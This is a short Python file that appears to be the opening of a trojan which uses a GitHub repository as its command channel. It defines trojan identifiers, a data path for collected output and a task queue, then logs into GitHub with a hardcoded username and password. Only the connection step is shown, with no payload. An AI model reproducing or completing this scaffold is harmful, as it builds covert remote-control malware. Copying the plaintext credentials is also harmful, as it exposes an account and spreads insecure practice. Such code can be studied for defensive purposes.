from bitbucket.bitbucket import Bitbucket
import json
import base64
import sys
import time
import imp
import random
import threading
import queue
import os
from github3 import login
trojan_id ="1"
trojan_config ="%s.json" % trojan_id
data_path = "data/%s/" % trojan_id
trojan_module= []
task_queue= queue.Queue()
configure = False


def ConnectTo():
	gh = login(username='buczek123', password='Xsw2#EDCv')
	repo = gh.repository('buczek123', 'helloworld')
	branch = repo.branch("master")	
	return gh, repo, branch

ConnectTo()